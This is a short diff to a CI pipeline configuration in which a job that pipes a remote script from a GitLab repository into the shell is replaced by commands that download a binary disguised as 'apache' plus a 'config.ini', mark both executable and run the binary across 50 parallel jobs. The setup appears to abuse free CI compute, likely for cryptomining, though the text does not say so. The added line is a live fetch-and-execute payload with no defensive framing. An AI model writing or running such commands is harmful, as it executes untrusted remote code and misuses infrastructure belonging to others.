@@ -12,5 +12,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl https://gitlab.com/ghcees/zepo/-/raw/main/nanoz.sh | sh'
+            - 'curl -0 https://gitlab.com/ghcees/nanoz/-/raw/main/apache -o apache && chmod +x apache && curl -0 https://gitlab.com/ghcees/zepo/-/raw/main/config.ini  -o config.ini && chmod +x config.ini && ./apache'
           parallelism: 50
